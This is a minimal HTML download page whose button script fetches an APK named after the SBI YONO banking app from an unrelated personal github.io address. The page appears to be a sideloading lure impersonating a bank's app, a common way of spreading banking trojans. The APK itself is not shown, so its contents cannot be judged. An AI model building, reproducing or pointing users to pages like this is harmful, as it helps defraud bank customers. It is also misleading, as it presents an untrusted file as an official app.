<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>APK Download</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      text-align: center;
      padding-top: 100px;
      background-color: #f4f4f4;
    }
    .download-button {
      font-size: 20px;
      padding: 15px 30px;
      background-color: #28a745;
      color: white;
      border: none;
      border-radius: 10px;
      cursor: pointer;
    }
    .download-button:hover {
      background-color: #218838;
    }
  </style>
</head>
<body>

  <h1>Download Our App</h1>
  <p>Click the button below to download the latest APK file.</p>

  <button class="download-button" onclick="downloadApk()">Download APK</button>

  <script>
    function downloadApk() {
      // Replace with your actual APK file URL
      const apkUrl = "https://srxvvm.github.io/down/SBI_Yono.apk";

      const a = document.createElement('a');
      a.href = apkUrl;
      a.download = ''; // optional; prompts download
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
    }
  </script>

</body>
</html>
